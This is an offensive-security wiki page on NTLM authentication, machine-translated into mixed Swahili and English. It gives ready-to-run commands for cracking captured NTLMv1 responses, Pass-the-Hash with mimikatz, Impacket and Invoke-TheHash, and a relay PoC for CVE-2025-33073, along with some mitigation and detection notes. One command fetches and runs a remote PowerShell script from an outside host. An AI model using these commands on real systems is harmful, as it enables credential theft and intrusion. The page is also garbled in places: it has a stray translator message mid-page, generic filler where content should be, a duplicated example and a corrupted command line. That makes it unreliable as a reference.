# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Katika mazingira ambapo **Windows XP and Server 2003** zipo katika matumizi, LM (Lan Manager) hashes hutumika, ingawa inajulikana sana kwamba hizi zinaweza kuathiriwa kwa urahisi. LM hash mahususi, `AAD3B435B51404EEAAD3B435B51404EE`, inaonyesha hali ambapo LM haitumiki, ikiwakilisha hash ya string tupu.

Kwa default, itifaki ya uthibitishaji ya **Kerberos** ndiyo njia kuu inayotumika. NTLM (NT LAN Manager) huingia chini ya hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa domain, Kerberos kushindwa kwa sababu ya configuration isiyo sahihi, au wakati connections zinajaribiwa kwa kutumia IP address badala ya valid hostname.

Uwepo wa header **"NTLMSSP"** katika network packets unaashiria mchakato wa uthibitishaji wa NTLM.

Support kwa authentication protocols - LM, NTLMv1, na NTLMv2 - huwezeshwa na DLL maalum iliyoko `%windir%\Windows\System32\msv1\_0.dll`.

**Key Points**:

- LM hashes ziko vulnerable na empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) huashiria kuwa haitumiki.
- Kerberos ndiyo default authentication method, huku NTLM ikitumika tu chini ya hali fulani.
- NTLM authentication packets hutambulika kwa header "NTLMSSP".
- Itifaki za LM, NTLMv1, na NTLMv2 zinaungwa mkono na system file `msv1\_0.dll`.

## LM, NTLMv1 and NTLMv2

You can check and configure which protocol will be used:

### GUI

Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Kuna level 6 (kutoka 0 hadi 5).

![](<../../images/image (919).png>)

### Registry

This will set the level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Thamani zinazowezekana:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **mtumiaji** huingiza **credentials** zake
2. Mashine ya client hutuma **ombi la authentication** ikituma **domain name** na **username**
3. **server** hutuma **challenge**
4. **client encrypts** **challenge** kwa kutumia hash ya password kama key na hutuma kama response
5. **server sends** kwa **Domain controller** **domain name, username, challenge na response**. Kama **hakuna** Active Directory iliyosanidiwa au domain name ni jina la server, credentials hukaguliwa **locally**.
6. **domain controller checks if everything is correct** na hutuma taarifa kwa server

**server** na **Domain Controller** wanaweza kuunda **Secure Channel** kupitia server ya **Netlogon** kwa sababu Domain Controller anajua password ya server (iko ndani ya db ya **NTDS.DIT**).

### Local NTLM authentication Scheme

Authentication ni kama ile iliyotajwa **before but** **server** anajua **hash of the user** anayejaribu kuauthenticate ndani ya faili la **SAM**. Hivyo, badala ya kumuuliza Domain Controller, **server will check itself** kama user anaweza authenticate.

### NTLMv1 Challenge

Urefu wa **challenge** ni **8 bytes** na **response** ni **24 bytes**.

**hash NT (16bytes)** hugawanywa katika **3 parts za 7bytes each** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho hujazwa zero**. Kisha, **challenge** inasimbwa **separately** kwa kila sehemu na **resulting** bytes zilizosimbwa huunganishwa. Jumla: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Ukosefu wa **randomness**
- Sehemu 3 zinaweza **kushambuliwa separately** ili kupata NT hash
- **DES is crackable**
- Key ya 3º huundwa daima na **5 zeros**.
- Kwa kuwa na **same challenge** **response** itakuwa **same**. Kwa hiyo, unaweza kumpa victim kama **challenge** string "**1122334455667788**" na kushambulia response kwa kutumia **precomputed rainbow tables**.

### NTLMv1 attack

Siku hizi ni nadra zaidi kupata mazingira yenye Unconstrained Delegation iliyosanidiwa, lakini hii haimaanishi huwezi **abuse a Print Spooler service** iliyosanidiwa.

Unaweza kutumia baadhi ya credentials/sessions ambazo tayari unazo kwenye AD ili **kuomba printer authenticate** dhidi ya host yoyote iliyo chini ya udhibiti wako. Kisha, ukitumia `metasploit auxiliary/server/capture/smb` au `responder` unaweza **kusanidi authentication challenge kuwa 1122334455667788**, kunasa jaribio la authentication, na kama lilifanyika kwa kutumia **NTLMv1** utaweza **kuli crack**.\
Ukia kutumia `responder` unaweza kujaribu **kutumia flag `--lm`** ili kujaribu **downgrade** ya **authentication**.\
_Kumbuka kwamba kwa technique hii authentication lazima ifanyike kwa kutumia NTLMv1 (NTLMv2 si halali)._

Kumbuka kwamba printer itatumia computer account wakati wa authentication, na computer accounts hutumia **long and random passwords** ambazo **huenda usiweze kucrack** kwa kutumia **dictionaries** za kawaida. Lakini **NTLMv1** authentication **hutumia DES** ([more info here](#ntlmv1-challenge)), hivyo kwa kutumia baadhi ya services maalum za cracking DES utaweza kucrack it (unaweza kutumia [https://crack.sh/](https://crack.sh) au [https://ntlmv1.com/](https://ntlmv1.com) kwa mfano).

### NTLMv1 attack with hashcat

NTLMv1 pia inaweza kuvunjwa kwa kutumia NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ambayo huformat NTLMv1 messages kwa njia inayoweza kuvunjwa kwa hashcat.

Amri
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
ingena pato hapo chini:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
I'm missing the actual contents to translate. Please paste the text from `src/windows-hardening/ntlm/README.md`, and I’ll translate it to Swahili while preserving the exact markdown/html syntax.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Run hashcat (distributed is best through a tool such as hashtopolis) kwani hii itachukua siku kadhaa vinginevyo.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Katika kesi hii tunajua password ya hii ni password, kwa hiyo tutacheat kwa madhumuni ya demo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sasa tunahitaji kutumia hashcat-utilities kubadilisha des keys zilizovunjwa kuwa sehemu za NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Hatimaye sehemu ya mwisho:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM

Wakati wa kupitisha hash za NTLM, ni kawaida kupata mwongozo wa ziada ili kuelewa vizuri jinsi protokali inavyofanya kazi na jinsi ya kuitumia katika mazingira halisi. Hapa chini kuna muhtasari mfupi wa vipengele muhimu:

- **NTLM hashes**: zimehifadhiwa kama thamani ya hash ya nenosiri la mtumiaji. Zinaweza kutumiwa kuthibitisha mtumiaji bila kufichua nenosiri lenyewe.
- **Pass-the-Hash**: mbinu ya kutumia hash iliyonaswa moja kwa moja kujiandikisha kama mtumiaji bila kujua nenosiri.
- **NTLM challenge-response**: mchakato ambapo seva hutuma challenge na mteja hujibu kwa kutumia hash ya nenosiri.

Kwa maelezo zaidi kuhusu mbinu zinazohusiana na NTLM na hardening ya Windows, angalia sehemu husika katika nyaraka hizi.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Urefu wa challenge ni bytes 8** na **responses 2 hutumwa**: Moja ni **bytes 24** kwa urefu na urefu wa **nyingine** ni **variable**.

**Response ya kwanza** huundwa kwa kusimba kwa kutumia **HMAC_MD5** **string** iliyoundwa na **client na domain** na kutumia kama **key** **hash MD4** ya **NT hash**. Kisha, **result** hiyo itatumika kama **key** kusimba kwa kutumia **HMAC_MD5** **challenge**. Kwa hili, **client challenge ya bytes 8 itaongezwa**. Jumla: 24 B.

**Response ya pili** huundwa kwa kutumia **thamani kadhaa** (new client challenge, **timestamp** ili kuepuka **replay attacks**...)

Ikiwa una **pcap** iliyorekodi **mchakato wa authentication uliofanikiwa**, unaweza kufuata guide hii ili kupata domain, username, challenge na response na ujaribu kuvunja password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Mara tu unapopata hash ya victim**, unaweza kuitumia ku**impersonate**.\
Unahitaji kutumia **tool** ambayo itafanya **NTLM authentication using** hiyo hash, **au** unaweza kuunda **sessionlogon** mpya na kuingiza **hash** hiyo ndani ya **LSASS**, ili wakati wowote **NTLM authentication** inapofanywa, **hash** hiyo itatumika. Chaguo la mwisho ndilo analofanya mimikatz.

**Tafadhali, kumbuka kwamba unaweza pia kufanya Pass-the-Hash attacks ukitumia Computer accounts.**

### **Mimikatz**

**Inahitaji kuendeshwa kama administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Hii itazindua process ambayo itakuwa ya users waliozindua mimikatz lakini ndani ya LSASS credentials zilizohifadhiwa ni zile zilizo ndani ya parameters za mimikatz. Kisha, unaweza kufikia network resources kana kwamba wewe ni huyo user (kama trick ya `runas /netonly` lakini huhitaji kujua plain-text password).

### Pass-the-Hash from linux

Unaweza kupata code execution kwenye Windows machines ukitumia Pass-the-Hash from Linux.\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Unaweza kupakua[ impacket binaries for Windows hapa](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Katika kesi hii unahitaji kutaja command, cmd.exe na powershell.exe si valid kupata interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Kuna nyingine nyingi zaidi za Impacket...

### Invoke-TheHash

Unaweza kupata scripts za powershell kutoka hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Kazi hii ni **mchanganyiko wa zote nyingine**. Unaweza kupitisha **several hosts**, **kutoa** baadhi na **kuchagua** **option** unayotaka kutumia (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ukichagua **lolote** kati ya **SMBExec** na **WMIExec** lakini **hupeani** parameta ya _**Command**_, itakuwa tu **inaangalia** kama una **ruhusa za kutosha**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Inahitaji kuendeshwa kama administrator**

Chombo hiki kitafanya kitu kilekile kama mimikatz (kurekebisha kumbukumbu ya LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manual Windows remote execution with username and password


{{#ref}}
../lateral-movement/
{{#endref}}

## Kuchota credentials kutoka kwenye Windows Host

**Kwa taarifa zaidi kuhusu** [**jinsi ya kupata credentials kutoka kwenye Windows host unapaswa kusoma ukurasa huu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Shambulio la Internal Monologue

Shambulio la Internal Monologue ni mbinu ya stealthy ya kuchota credentials inayomruhusu mshambuliaji kupata NTLM hashes kutoka kwenye mashine ya mwathiriwa **bila kuingiliana moja kwa moja na mchakato wa LSASS**. Tofauti na Mimikatz, ambayo husoma hashes moja kwa moja kutoka kwenye memory na mara nyingi huzuiwa na endpoint security solutions au Credential Guard, shambulio hili hutumia **local calls kwa NTLM authentication package (MSV1_0) kupitia Security Support Provider Interface (SSPI)**. Mshambuliaji kwanza **hushusha NTLM settings** (mfano, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ili kuhakikisha kwamba NetNTLMv1 inaruhusiwa. Kisha hujifanya kuwa tokeni za watumiaji waliopo zilizopatikana kutoka kwenye processes zinazoendeshwa na kuchochea NTLM authentication locally ili kuzalisha NetNTLMv1 responses kwa kutumia challenge inayojulikana.

Baada ya kunasa NetNTLMv1 responses hizi, mshambuliaji anaweza haraka kurejesha NTLM hashes za asili kwa kutumia **precomputed rainbow tables**, jambo linalowezesha mashambulio ya Pass-the-Hash zaidi kwa lateral movement. Muhimu zaidi, Internal Monologue Attack hubaki stealthy kwa sababu haizalishi network traffic, haiingizi code, wala haichochei direct memory dumps, hivyo ni vigumu kwa defenders kuigundua ikilinganishwa na mbinu za jadi kama Mimikatz.

Ikiwa NetNTLMv1 haikubaliwi—kwa sababu ya enforced security policies, basi mshambuliaji anaweza kushindwa kupata NetNTLMv1 response.

Ili kushughulikia hali hii, tool ya Internal Monologue ilisasishwa: Hupata server token kwa dynamically kwa kutumia `AcceptSecurityContext()` ili bado **kunasa NetNTLMv2 responses** ikiwa NetNTLMv1 itashindwa. Ingawa NetNTLMv2 ni ngumu zaidi kuvunjwa, bado hufungua njia kwa relay attacks au offline brute-force katika baadhi ya kesi chache.

PoC inaweza kupatikana katika **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay na Responder

**Soma mwongozo wa kina zaidi kuhusu jinsi ya kutekeleza mashambulio hayo hapa:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parse NTLM challenges kutoka kwenye network capture

**Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* kupitia Serialized SPNs (CVE-2025-33073)

Windows ina mitigations kadhaa ambazo hujaribu kuzuia mashambulio ya *reflection* ambapo NTLM (au Kerberos) authentication inayotoka kwenye host hurudishwa kwa **host hiyo hiyo** ili kupata SYSTEM privileges.

Microsoft ilivunja chains nyingi za public kwa MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) na patches za baadaye, hata hivyo **CVE-2025-33073** inaonyesha kwamba protections bado zinaweza kupuuzwa kwa kutumia vibaya jinsi **SMB client hufupisha Service Principal Names (SPNs)** ambazo zina *marshalled* (serialized) target-info.

### TL;DR ya bug
1. Mshambuliaji anasajili **DNS A-record** whose label in encode marshalled SPN – mfano
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Mwathiriwa analazimishwa ku authenticate kwa hiyo hostname (PetitPotam, DFSCoerce, etc.).
3. Wakati SMB client inapopitisha target string `cifs/srv11UWhRCAAAAA…` kwa `lsasrv!LsapCheckMarshalledTargetInfo`, call ya `CredUnmarshalTargetInfo` **huondoa** serialized blob, ikiacha **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (au Kerberos equivalent) sasa huihesabu target kuwa *localhost* kwa sababu short host part inalingana na jina la computer (`SRV1`).
5. Kwa hiyo, server huweka `NTLMSSP_NEGOTIATE_LOCAL_CALL` na kuingiza **LSASS’ SYSTEM access-token** ndani ya context (kwa Kerberos subsession key iliyo na alama ya SYSTEM huundwa).
6. Relaying authentication hiyo kwa `ntlmrelayx.py` **au** `krbrelayx.py` huleta full SYSTEM rights kwenye host hiyo hiyo.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* KB patch for **CVE-2025-33073** inaongeza check katika `mrxsmb.sys::SmbCeCreateSrvCall` ambayo inazuia connection yoyote ya SMB ambayo target yake ina marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Tekeleza **SMB signing** ili kuzuia reflection hata kwenye hosts ambazo hazijapatchiwa.
* Fuatilia DNS records zinazofanana na `*<base64>...*` na zuia coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Network captures zenye `NTLMSSP_NEGOTIATE_LOCAL_CALL` ambapo client IP ≠ server IP.
* Kerberos AP-REQ iliyo na subsession key na client principal sawa na hostname.
* Windows Event 4624/4648 SYSTEM logons zinazofuatwa mara moja na remote SMB writes kutoka host ile ile.

Kwa variant ya **March 2026** ya local reflection ambayo inatumia **SMB arbitrary ports** na **TCP connection reuse** kufikia `NT AUTHORITY\SYSTEM`, tazama:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
